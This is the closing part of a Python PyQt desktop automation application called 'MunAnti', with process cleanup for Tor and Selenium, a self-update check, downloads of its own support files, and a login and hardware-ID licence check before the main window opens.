		f = open(processing_pid_path, 'r')
		result = f.read()
		for line in result.split('\n'):
			if line.strip():
				try:
					os.kill(int(line.strip()),signal.SIGILL)
				except:
					pass
		f.close()
		f = open(processing_pid_path, 'w')
		f.close()
	print('list_tor_process==', list_tor_process)
	for line_process in list_tor_process:
		SOCKS_PORT, CONTROL_PORT, tor_process = line_process
		tor_process.kill()	
	for line_driver in list_selenium_drivers:
		line_driver.quit()
  
def show_error(msg_string):
	msg = QMessageBox()
	msg.setIcon(QMessageBox.Critical)
	msg.setText(msg_string)
	# msg.setInformativeText(msg_string)
	msg.setWindowTitle("Error notificion")
	
	sys.exit(msg.exec_())
def main():
	# get appFolderPath
	
	global appFolderPath
	try:
		import ctypes
		myappid = 'Meomun.Automator'  # arbitrary string
		ctypes.windll.shell32.SetCurrentProcessExplicitAppUserModelID(myappid)
	except:
		pass
	if getattr(sys, 'frozen', False):
		appFolderPath = os.path.dirname(os.path.realpath(sys.executable))
	elif __file__:
		appFolderPath = os.path.dirname(__file__)
	c = open('version.txt','w')
	c.write(__version__)
	c.close()
	print('===check update===')
	mun_update = MunAntiUpdate.MunAntiUpdate()
	update_url = mun_update.check_update_version()
	if update_url:
		if sys.platform == "linux" or sys.platform == "linux2":
			# linux
			subprocess.run(['open',appFolderPath+"/MunAntiUpdate.exe"],check=True) 
		elif sys.platform == "darwin":
			# OS X
			subprocess.run(['open',appFolderPath+"/MunAntiUpdate.exe"],check=True) 
		else:       
			subprocess.Popen([appFolderPath+"/MunAntiUpdate.exe"], stdout=None, stderr=None, stdin=None, close_fds=True)
		return
	

	# print('application_path==', appFolderPath)
	# subprocess.run(['open',appFolderPath+"/MunAntiUpdate.py"],check=True) 
	# add freeze support
	mun_api = munantiapi.MunAntiApi()
	hwid = mun_api.get_hwid()
	app = QtWidgets.QApplication(sys.argv)
	app.setWindowIcon(QtGui.QIcon('icons/icon.jpg'))
	print('===Check and add missing files===')
	fileMaps = {}
	fileMaps['chrome'] = {'download_url':'https://munanti.s3.ap-southeast-1.amazonaws.com/chrome.zip', 'version':'109.0.5414.75'}
	fileMaps['MunProxies'] = {'download_url':'https://munanti.s3.ap-southeast-1.amazonaws.com/MunProxies.zip', 'version':'1.0.0'}
	fileMaps['ffmpeg.exe'] = {'download_url':'https://munanti.s3.ap-southeast-1.amazonaws.com/ffprobe.zip', 'version':'1.0.0'}
	fileMaps['MunAntiupdate.exe'] = {'download_url':'https://munanti.s3.ap-southeast-1.amazonaws.com/MunAntiupdate.zip', 'version':'1.0.0'}
	mun_api.check_download_files_map(fileMaps)
 
	if mun_api.token:
		setting_result = mun_api.get_tool_setting(action='hwid', dataGet={'hwid':hwid})
		try:
			setting_result = mun_api.get_tool_setting(action='hwid', dataGet={'hwid':hwid})
		except :
			login = Login()
			login.show()
			result = login.exec_()
			if result == QtWidgets.QDialog.Accepted:
				mun_api.get_or_save_token()
				setting_result = mun_api.get_tool_setting(action='hwid', dataGet={'hwid':hwid})
				print(setting_result)
				ex = MainWindow(setting_result)
				ex.show()
		else:
			# print(setting_result)
			if 'hwid' in setting_result and setting_result['hwid']:
				ex = MainWindow(setting_result)
				ex.show()
			else:
				with open('hwid.txt', 'w') as f:
					f.write(hwid)
				print('===Your Hwid incorrect==')
				show_error('Your Hwid incorrect. Doubcheck with hwid.txt')
				
	else:
		login = Login()
		login.show()
		result = login.exec_()
		if result == QtWidgets.QDialog.Accepted:
			mun_api.get_or_save_token()
			setting_result = mun_api.get_tool_setting(action='hwid', dataGet={'hwid':hwid})
			print(setting_result)
			ex = MainWindow(setting_result)
			ex.show()
	
	# r = mun_api.check_version_for_update()
	# if r != __version__:
	# 	print('Trying to update')

	# update_path = os.path.join(appFolderPath, 'MunAnti.py')
	# myproc = os.system(update_path)
	# print('===check update===')
	# app.show()
	result_app = app.exec_()
	clear_process()
	# exit()
	# print('done')
	sys.exit(result_app)



if __name__ == '__main__':
	multiprocessing.freeze_support()
	main()

